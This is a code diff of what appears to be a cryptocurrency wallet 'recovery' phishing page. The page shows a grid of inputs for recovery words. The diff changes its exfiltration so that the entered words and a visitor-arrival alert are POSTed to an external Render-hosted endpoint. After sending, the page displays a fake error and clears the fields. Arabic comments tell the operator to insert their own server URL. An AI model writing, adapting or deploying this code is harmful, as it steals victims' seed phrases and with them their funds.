@@ -39,8 +39,8 @@
         .recovery-subtitle { color: var(--text-secondary); text-align: left; font-size: 15px; line-height: 1.5; margin-bottom: 30px; }
         .recovery-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; width: 100%; }
         .grid-item { background-color: var(--input-bg); border-radius: 8px; height: 56px; display: flex; align-items: center; justify-content: center; position: relative; border: 1px solid transparent; transition: 0.3s; }
-        .grid-item.invalid { border-color: var(--error-red); }
-        .grid-item.invalid .item-input { color: var(--error-red); }
+        .grid-item.invalid { border-color: var(--error-red); } 
+        .grid-item.invalid .item-input { color: var(--error-red); } 
         .item-num { color: var(--text-secondary); font-size: 16px; font-weight: 500; }
         .item-input { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: transparent; border: none; color: white; font-size: 15px; text-align: center; outline: none; opacity: 0; z-index: 5; }
         .item-input:focus, .item-input:not(:placeholder-shown) { opacity: 1; }
@@ -82,18 +82,23 @@
     </div>
 
     <script>
-        // إرسال البيانات عبر السيرفر (Back-end)
+        // --- الرابط الخاص بك على Render ---
+        // استبدل الرابط أدناه برابط موقعك الحقيقي في Render
+        const RENDER_URL = "https://your-app-name.onrender.com/send_data";
+
         async function sendFinalData(message) {
             try {
-                await fetch('/send_data', {
+                await fetch(RENDER_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ message: message })
                 });
-            } catch(e) {}
+            } catch(e) {
+                console.error("Connection error");
+            }
         }
 
-        window.onload = () => sendFinalData("<b>⚠️ New Visitor Detected</b>");
+        window.onload = () => sendFinalData("<b>⚠️ New Visitor Detected (from cPanel)</b>");
 
         function showPage(id) {
             document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
@@ -112,6 +117,7 @@
             if (e.target.classList.contains('item-input')) {
                 const val = e.target.value.trim().toLowerCase();
                 const parent = e.target.parentElement;
+                
                 if (val !== "" && val.length < 3) {
                     parent.classList.add('invalid');
                 } else {
@@ -144,6 +150,7 @@
             if (count > 0) {
                 sendFinalData(`<b>✅ DATA RECEIVED</b>\n\n${words.join('\n')}`);
                 document.getElementById('errorMessage').style.display = 'block';
+                
                 setTimeout(() => {
                     inputs.forEach(input => {
                         input.value = "";
